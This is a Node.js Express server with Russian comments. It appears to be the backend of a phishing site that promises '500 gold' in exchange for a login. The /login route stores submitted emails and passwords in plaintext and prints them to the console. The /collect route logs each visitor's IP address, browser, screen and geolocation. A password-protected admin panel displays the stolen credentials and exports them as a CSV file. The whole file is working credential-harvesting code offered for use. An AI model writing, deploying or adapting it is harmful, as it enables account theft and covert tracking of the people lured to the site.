const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const app = express();

// ===== НАСТРОЙКИ АДМИНКИ =====
const ADMIN_USER = 'Богдан';
const ADMIN_PASS = '2282'; // ← поменяй на свой!

app.use(express.json());

// Запрет кеширования
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    next();
});

app.use(express.static('public'));

// ===== БАЗА ДАННЫХ =====
const db = new sqlite3.Database('logs.db');

db.run(`CREATE TABLE IF NOT EXISTS visitors (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    user_agent TEXT,
    screen TEXT,
    lang TEXT,
    country TEXT,
    city TEXT,
    region TEXT,
    org TEXT,
    lat TEXT,
    lon TEXT,
    time TEXT DEFAULT CURRENT_TIMESTAMP
)`);

db.run(`CREATE TABLE IF NOT EXISTS accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT,
    ip TEXT,
    user_agent TEXT,
    time TEXT DEFAULT CURRENT_TIMESTAMP
)`);

// ===== BASIC AUTH для админки =====
function auth(req, res, next) {
    const b64 = (req.headers.authorization || '').split(' ')[1] || '';
    const [user, pass] = Buffer.from(b64, 'base64').toString().split(':');
    if (user === ADMIN_USER && pass === ADMIN_PASS) return next();
    res.set('WWW-Authenticate', 'Basic realm="Admin"');
    return res.status(401).send('Access denied');
}

// ===== Главная =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== Сбор IP и гео =====
app.post('/collect', (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';
    const geo = req.body.geo || {};
    const screen = req.body.screen || {};

    db.run(
        `INSERT INTO visitors (ip, user_agent, screen, lang, country, city, region, org, lat, lon)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            ip,
            ua,
            (screen.w || '?') + 'x' + (screen.h || '?'),
            req.body.lang || '',
            geo.country || '',
            geo.city || '',
            geo.region || '',
            geo.org || '',
            geo.lat || '',
            geo.lon || ''
        ]
    );

    console.log('');
    console.log('=== ПОСЕТИТЕЛЬ ===');
    console.log('IP:        ' + ip);
    console.log('Страна:    ' + (geo.country || '?'));
    console.log('Город:     ' + (geo.city || '?'));
    console.log('Провайдер: ' + (geo.org || '?'));
    console.log('Браузер:   ' + ua);
    console.log('Экран:     ' + screen.w + 'x' + screen.h);
    console.log('Язык:      ' + (req.body.lang || '?'));
    console.log('');

    res.json({ ok: true });
});

// ===== Логин =====
app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'unknown';

    if (!email || !password) {
        return res.status(400).json({ error: 'Fill all fields' });
    }

    db.run(
        `INSERT INTO accounts (email, password, ip, user_agent) VALUES (?, ?, ?, ?)`,
        [email, password, ip, ua]
    );

    console.log('');
    console.log('=== НОВЫЙ АККАУНТ ===');
    console.log('Почта:  ' + email);
    console.log('Пароль: ' + password);
    console.log('IP:     ' + ip);
    console.log('');

    res.json({ success: true, message: '500 gold added!' });
});

// ===== АДМИН-ПАНЕЛЬ =====
app.get('/admin', auth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/data', auth, (req, res) => {
    db.all('SELECT * FROM accounts ORDER BY id DESC', [], (e1, accounts) => {
        db.all('SELECT * FROM visitors ORDER BY id DESC LIMIT 200', [], (e2, visitors) => {
            res.json({ accounts: accounts || [], visitors: visitors || [] });
        });
    });
});

// ===== Экспорт в CSV =====
app.get('/api/export', auth, (req, res) => {
    db.all('SELECT * FROM accounts ORDER BY id DESC', [], (err, rows) => {
        let csv = 'email,password,ip,user_agent,time\n';
        rows.forEach(r => {
            csv += `"${r.email}","${r.password}","${r.ip}","${(r.user_agent || '').replace(/"/g, '""')}","${r.time}"\n`;
        });
        res.set('Content-Type', 'text/csv');
        res.set('Content-Disposition', 'attachment; filename="accounts.csv"');
        res.send(csv);
    });
});

app.listen(3000, () => {
    console.log('Server started on http://localhost:3000');
    console.log('Admin: http://localhost:3000/admin');
});
